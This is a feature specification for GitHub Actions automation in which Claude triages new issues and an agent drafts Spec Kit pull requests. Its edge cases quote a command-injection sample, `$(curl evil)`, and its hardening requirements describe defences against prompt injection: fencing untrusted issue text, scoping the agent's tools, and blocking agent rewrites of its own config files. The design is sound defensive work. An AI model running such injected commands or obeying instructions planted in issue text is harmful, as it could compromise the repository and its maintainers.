# Feature Specification: Issue triage automation

**Feature Branch**: `002-issue-triage-automation`

**Created**: 2026-10-01

**Status**: Draft

**Input**: User description: "GitHub Actions automation that classifies every new issue (type, area, priority, state, duplicate, Spec Kit route) with an LLM (Anthropic Claude; deterministic keyword-heuristic fallback when no key is configured or the call fails), labels and comments on it, and — for trusted, routable issues — drafts a Spec Kit spec/plan/tasks PR with an AI agent, guarded so it can never touch application code."

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Automatic triage on new issues (Priority: P1)

A contributor opens a new issue. Without any maintainer action, the issue ends up labeled with a
type, a priority, a state, and (when applicable) an area, and carries one AI-authored comment
explaining the classification, its rationale, and the suggested Spec Kit route.

**Why this priority**: This is the core value of the feature — it removes manual first-pass triage
for every issue. Nothing else in this feature matters if this does not work.

**Independent Test**: Open (or dispatch against) a test issue whose text obviously matches one
category, and confirm it is labeled correctly and carries exactly one comment starting with the
AI-disclosure line, within the same workflow run that triggered it.

**Acceptance Scenarios**:

1. **Given** a new issue has no labels, **When** `issues: opened` fires, **Then** it ends up with
   a type label, a priority label, a state label (and an area label if one applies), the
   `triaged` label, and exactly one triage comment.
2. **Given** a maintainer already applied `chore` and `p1` labels to the issue (for example via a
   template) before triage runs, **When** triage runs, **Then** the existing `chore` and `p1`
   labels are left untouched and only the still-missing dimensions (area, state) are filled in.
3. **Given** no model key is configured, or the Anthropic API call fails or returns an unusable
   response, **When** triage runs, **Then** the issue still receives labels and a comment,
   produced by the deterministic heuristic (with `area` left unset), and the comment discloses
   that the fallback was used.

---

### User Story 2 - Manual re-triage via workflow dispatch (Priority: P2)

A maintainer wants to re-run triage on a specific issue — for example after editing its
description, or because the first run used the fallback heuristic. They dispatch the workflow
with the issue number, optionally forcing a re-run even though the `triaged` label is already
present.

**Why this priority**: Needed to recover from a stale or fallback-produced classification without
hand-editing labels; it depends on User Story 1's classification logic already existing.

**Independent Test**: Dispatch the workflow against an already-triaged issue with no `force` input
and confirm it is skipped with the existing triage comment untouched; dispatch again with
`force: true` and confirm that same comment is updated in place.

**Acceptance Scenarios**:

1. **Given** an issue already carries the `triaged` label, **When** the workflow is dispatched for
   its number without `force`, **Then** no new comment is posted and the run completes without
   error.
2. **Given** an issue already carries the `triaged` label, **When** the workflow is dispatched with
   `force: true`, **Then** classification runs again and the issue's existing triage comment is
   updated in place (no second comment is created).
3. **Given** an issue number that does not exist in the repository, **When** the workflow is
   dispatched with that number, **Then** the run fails with a clear error rather than silently
   doing nothing.

---

### User Story 3 - Spec Kit prep draft for trusted, routable issues (Priority: P2)

A maintainer-authored feature request is triaged with `speckit_route: specify`. Because the
author is a maintainer and the Anthropic secret is configured, a second job automatically drafts
a new `specs/NNN-*` feature (spec, self-answered clarify, plan, tasks) on a dedicated branch and
opens a draft pull request linking the issue, so refinement starts from a concrete draft instead
of a blank page. A `speckit_route: converge` issue instead amends an existing feature's spec and
appends a new tasks phase.

**Why this priority**: This is the differentiating automation beyond labeling, but it depends on
a secret and a trust check that may not be present at rollout, so it is validated separately from
the always-on triage path.

**Independent Test**: Trigger prep for a trusted, `specify`-routed issue and confirm a
`triage/issue-<N>` branch exists containing only `specs/**` changes and a draft PR open against
it; trigger prep for a `converge`-routed issue and confirm it amends an existing spec and tasks
file instead of creating a new feature directory.

**Acceptance Scenarios**:

1. **Given** an issue triaged with `speckit_route: specify` from an OWNER, **When** the
   `ANTHROPIC_API_KEY` secret is present, **Then** a new `specs/NNN-*` directory is committed to a
   `triage/issue-<N>` branch and a draft PR linking the issue is opened.
2. **Given** an issue triaged with `speckit_route: converge`, **When** prep runs, **Then** the
   targeted feature's `spec.md` is amended in place and its `tasks.md` gains a new
   `## Phase N: Convergence` section, with no new `specs/NNN-*` directory created.
3. **Given** the prep agent's changes touch a path outside `specs/**` and `docs/**`, **When** the
   guard step runs, **Then** the run fails before any commit is pushed.
4. **Given** the repository setting "Allow GitHub Actions to create pull requests" is disabled,
   **When** prep finishes pushing its branch, **Then** a comment with a compare link is posted
   instead of a draft PR.

---

### User Story 4 - Untrusted or unready issues are safely declined (Priority: P3)

An external contributor's bug report is triaged with `speckit_route: none`, or a maintainer's
feature idea is triaged with `speckit_route: specify` but the Anthropic secret is not yet
configured. In both cases prep never starts, and in the latter case the maintainer is told
exactly why.

**Why this priority**: Prevents wasted or failed prep runs and keeps untrusted issue content away
from the prep agent before the feature is fully configured. Lower priority than the others because
User Story 1 already delivers the feature's core value without this.

**Independent Test**: Trigger triage on an issue from a non-collaborator account whose content
would otherwise warrant `speckit_route: specify`, and confirm prep never runs and a skip-reason
comment appears.

**Acceptance Scenarios**:

1. **Given** an issue's `speckit_route` is `none`, **When** triage finishes, **Then** the prep job
   does not run and no skip comment is posted.
2. **Given** an issue's `speckit_route` is `specify` but its author is not an OWNER, MEMBER, or
   COLLABORATOR, **When** triage finishes, **Then** prep does not run and a comment explains it
   was skipped because of the author's association.
3. **Given** the `ANTHROPIC_API_KEY` secret is not configured, **When** an otherwise-eligible issue
   is triaged, **Then** prep does not run and a comment explains the missing secret.

---

### Edge Cases

- An issue is opened with an empty body: classification still runs (model or heuristic) and
  `duplicate_of` is `null`.
- An issue already carries `triaged` and the dispatch is run without `force`: the run exits
  cleanly with no new labels or comment, not as a failure.
- "Allow GitHub Actions to create pull requests" is disabled: prep still commits and pushes its
  branch, then comments a compare link instead of failing the run.
- No model key is configured, or the Anthropic API call returns malformed or non-JSON output:
  triage falls back to the deterministic heuristic (which never sets `area`) instead of failing
  the run.
- Issue text contains shell metacharacters or command-injection attempts (for example
  `$(curl evil)`     ): it is only ever written to a file and read by the prep agent as data, never
  interpolated into a shell `run:` step.
- `duplicate_of` names a closed or nonexistent issue number: it is still surfaced in the comment as
  advisory text; no issue is automatically closed or cross-linked.
- A workflow-dispatched `issue_number` does not correspond to any issue in the repository: the run
  fails loudly instead of completing silently with no effect.

## Requirements *(mandatory)*

### Functional Requirements

**Stage 1 — Triage**

- **FR-001**: System MUST label and comment on every newly opened issue with an AI-generated
  classification, without requiring maintainer action.
- **FR-002**: System MUST also support re-running triage against an existing issue on demand via
  `workflow_dispatch`, taking a required `issue_number` input and an optional `force` input.
- **FR-003**: System MUST classify each issue along six dimensions plus a rationale: `type`,
  `area`, `priority`, `state`, `duplicate_of`, and `speckit_route`.
- **FR-004**: `type` MUST be one of: bug, enhancement, documentation, spike, chore, question,
  design, feature.
- **FR-005**: `area` MUST be one of the repository's existing area labels (accessibility, build,
  session-list, approvals, chat, worktree, transport, notifications, settings, right-pane)
  or `none`. (`design` is a `type`, not an `area` — see FR-004.)
- **FR-006**: `priority` MUST be one of p1, p2, p3, chosen per the rubric: p1 blocks core use,
  security, or data loss, or is a named near-term milestone; p2 is normal planned work; p3 is
  polish or a nice-to-have.
- **FR-007**: `state` MUST be one of ready-for-agent, ready-for-human, needs-info, needs-triage.
- **FR-008**: `speckit_route` MUST be one of specify, converge, none.
- **FR-009**: System MUST classify issues by calling the Anthropic Messages API (model
  configurable via `TRIAGE_MODEL`, default `claude-haiku-4-5`) with a prompt constrained to return
  the classification as structured JSON, using the optional `ANTHROPIC_API_KEY` secret (the same
  secret stage 2 uses).
- **FR-010**: When `ANTHROPIC_API_KEY` is not configured, or the Anthropic API call fails (network
  error, rate limit, timeout) or returns an unparsable response, System MUST fall back to a
  deterministic keyword heuristic covering the same fields except `area`, which the heuristic
  always leaves unset.
- **FR-011**: When the heuristic fallback produced the classification, the triage comment MUST
  state that explicitly, rather than implying the model classified it.
- **FR-012**: System MUST skip re-triaging an issue that already carries the `triaged` label unless
  the run was dispatched with `force: true`.
- **FR-013**: System MUST never overwrite a type, area, or priority label a maintainer already
  applied; it MUST only add a label for a dimension that is not already set.
- **FR-014**: System MUST create any of the four state labels that do not yet exist in the
  repository before applying them.
- **FR-015**: System MUST apply the `triaged` label only after classification, other labels, and
  the comment have all succeeded, so a mid-run failure leaves the issue retriable.
- **FR-016**: System MUST maintain exactly one live triage comment per issue, identified by a
  hidden marker, beginning with the literal line `> *This was generated by AI during triage.*` and
  summarizing the chosen type, area, priority, state, rationale, and `speckit_route`; a later run
  (for example `force`) MUST update that same comment in place rather than posting a new one.
- **FR-017**: System MUST run the triage job with only the permissions it needs: `contents: read`,
  `issues: write`.

**Stage 2 — Prep**

- **FR-018**: System MUST start a prep run only when all three hold: the triage classification's
  `speckit_route` is `specify` or `converge`; the issue author's association is OWNER, MEMBER, or
  COLLABORATOR; and the `ANTHROPIC_API_KEY` secret is configured.
- **FR-019**: When `speckit_route` is `specify` or `converge` but prep cannot start because the
  author-association or secret condition fails, System MUST post a comment stating that prep was
  skipped and which condition failed.
- **FR-020**: System MUST write the issue's title and body to a file (`.triage/issue-<N>.md`)
  rather than interpolating it into any shell `run:` step, so issue content can never execute as a
  command.
- **FR-021**: For `speckit_route: specify`, the prep agent MUST create a new `specs/NNN-*` feature
  by running the repository's specify command, self-answering its own clarify questions by
  choosing the recommended option for each and flagging every self-answered item as "assumed," then
  running plan and tasks.
- **FR-022**: For `speckit_route: converge`, the prep agent MUST amend the targeted feature's
  existing `spec.md` as needed and append a new `## Phase N: Convergence` section to its
  `tasks.md`, rather than creating a new feature.
- **FR-023**: Prep MUST produce only specification artifacts (spec, plan, tasks, and related Spec
  Kit documents); it MUST NOT produce application implementation code.
- **FR-024**: A deterministic guard step MUST inspect every path changed by the prep agent and fail
  the run if any changed path falls outside `specs/**` and `docs/**`.
- **FR-025**: System MUST commit prep output to a branch named `triage/issue-<N>` and MUST NOT
  commit to `main`.
- **FR-026**: System MUST push that branch and open a draft pull request linking the source issue.
- **FR-027**: If "Allow GitHub Actions to create pull requests" is disabled so the draft PR cannot
  be opened, System MUST instead post a comment containing a compare link for the pushed branch.

**Hardening** (added after independent security and code review found stage 2 — never yet run
live, since no `ANTHROPIC_API_KEY` secret exists — unsafe by construction; corrected before its
first live run)

- **FR-028**: System MUST run stage 2 as three separate jobs — `triage` (exports the issue),
  `prep-agent` (runs the agent), `publish` (validates and commits) — so the job that ever handles
  untrusted issue content never holds push, label, or comment capability.
- **FR-029**: The `prep-agent` job MUST run with `contents: read` only, MUST NOT have
  `GH_TOKEN`/`GITHUB_TOKEN` at the job level, and MUST NOT execute any `git` command.
- **FR-030**: `prep-agent` MUST always check out the repository's default branch fresh; it MUST
  NOT start from an existing `triage/issue-<N>` branch, whose `.omp/commands`,
  `.specify/scripts/powershell/*.ps1`, `CLAUDE.md`, or `.claude/settings.json` a prior
  agent-influenced run could have rewritten.
- **FR-031**: The agent's tool allowlist MUST be scoped — `Read(./**)`, `Edit(specs/**)`,
  `Edit(docs/**)` (which also governs the Write tool), bare `Glob`/`Grep`, and `Bash` pinned to
  exactly the Spec Kit PowerShell scripts it needs, each as an exact-prefix-plus-space rule — never
  a bare `Read`/`Write`/`Edit`, and never a `Bash` prefix rule that fails to match the agent's real
  invocations.
- **FR-032**: The guard MUST reject, independent of git state (which the agent's own checkout
  could have manipulated): any symlink; any path containing a `..` segment or a leading `/`; any
  file over 1 MiB; more than 300 total files; and anything that is not a regular file matching
  `specs/<NNN-kebab-name>/**/*.md` or `docs/**/*.md` — closing the gap where a bare `docs/**`
  allowlist would have covered runnable code (`docs/spike/*.mjs`, `*.ts`).
- **FR-033**: `trusted` MUST require both the issue author's `author_association` being one of
  `OWNER`/`MEMBER`/`COLLABORATOR` *and* a live repository-permission check reporting
  `admin`/`maintain`/`write` (an `OWNER` author is exempt from the live check); any error from that
  check MUST fail closed to "not trusted", since `author_association` alone is also true for a
  read-only collaborator.
- **FR-034**: The triage comment MUST state exactly why prep is skipped (missing secret, author
  without real write access, or state not `ready-for-agent`) and MUST claim prep will run only when
  every gating condition in FR-018/FR-033 actually holds.
- **FR-035**: A `force` re-triage MUST distinguish labels the bot itself previously applied (from a
  hidden JSON marker in its own comment) from maintainer-set labels, never treating its own prior
  output as a maintainer's pin; and MUST remove a stale state label when the state changes, since
  the four state labels are mutually exclusive.
- **FR-036**: Issue title/body text exported for the prep agent MUST be wrapped between two
  randomly-nonced fence marker lines and explicitly labelled as untrusted data, and MUST NOT be
  passed as a literal shell argument to any Spec Kit script.
- **FR-037**: `publish` MUST push using a step-scoped git credential (`GIT_CONFIG_COUNT`/
  `GIT_CONFIG_KEY_0`/`GIT_CONFIG_VALUE_0`), never a token embedded in a URL or passed to `git` as a
  plain command-line argument.
- **FR-038**: Every third-party GitHub Action this workflow uses MUST be pinned to a full commit
  SHA, not a moving tag, kept current by a Dependabot `github-actions` ecosystem configuration.

### Key Entities

- **Issue**: A GitHub issue with a number, title, body, existing labels, and author association;
  the unit of work for both stages.
- **Classification**: The result of stage 1 — type, area, priority, state, duplicate_of,
  speckit_route, and rationale — produced by either the model or the heuristic fallback.
- **Triage comment**: The single AI-authored comment per triage run that discloses and summarizes
  a Classification.
- **Prep branch/PR**: The `triage/issue-<N>` branch and its draft pull request carrying a new or
  amended set of Spec Kit artifacts for one issue.
- **Guard check**: The deterministic path-scope validation that gates the prep job's commit to
  `specs/**` and `docs/**`.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Every issue opened in the repository receives labels and a triage comment within the
  triggering workflow run, with no manual step, under normal (non-fallback) conditions.
- **SC-002**: Dispatching triage against an already-triaged issue without `force` leaves its
  labels and comment history unchanged — no duplicate comment is posted.
- **SC-003**: 100% of prep runs whose agent touches any path outside `specs/**` or `docs/**` are
  blocked by the guard before a commit is made; none reach a pushed branch or PR.
- **SC-004**: 100% of issue title/body content stays out of interpolated `run:` shell steps in
  `issue-triage.yml` — verifiable by inspecting the workflow file for any `run:` block that embeds
  issue event fields directly.
- **SC-005**: When no model key is configured or the model call fails, triage still completes with
  a heuristic classification and a disclosing comment, with zero workflow failures attributable to
  the model call alone.
- **SC-006**: Live `workflow_dispatch` runs against throwaway issues #90 (rename Pinion to Refract)
  and #91 (logo/icon design) each produce the expected labels (chore/p1 and design/p2
  respectively) and a disclosure comment.

## Assumptions

- Prep's skip-comment (FR-019) fires only when `speckit_route` is `specify` or `converge` but the
  real-write-access, state, or secret gate fails (FR-018, FR-033, FR-034). When `speckit_route` is
  `none`, no Spec Kit work is applicable, so prep does not run and posts no additional comment.
- The "existing area labels" are the ones already defined in the repository (accessibility, build,
  session-list, approvals, chat, worktree, transport, notifications, settings, right-pane).
  Triage never creates a new area label; it only chooses among these or leaves area unset (`none`).
  `design` is a `type`, not an area (FR-005).
- `.triage/issue-<N>.md` is produced by the `triage` job and handed to `prep-agent` as the
  `issue-export` artifact (FR-028); the guard only allows committed changes under `specs/**` and
  `docs/**`, so this file is never part of what `publish` commits or pushes.
- `duplicate_of` is advisory text surfaced in the triage comment; the system never automatically
  closes or cross-links issues as duplicates.
- The repository's low issue volume and the Anthropic API's default rate limits are compatible
  with one classification call per triage run; no request queuing or backoff beyond the heuristic
  fallback is needed for v1.
- GitHub Models (`models.github.ai`) is fully retired (as of 2026-07-30), so classification uses
  the Anthropic Messages API instead, gated on the same optional `ANTHROPIC_API_KEY` secret stage
  2 requires; with no key configured, every issue is classified by the deterministic heuristic.
- Node 22 is available on the `ubuntu-latest` GitHub-hosted runner used by the workflow (pinned
  explicitly via `actions/setup-node` rather than relying on the runner image's default).
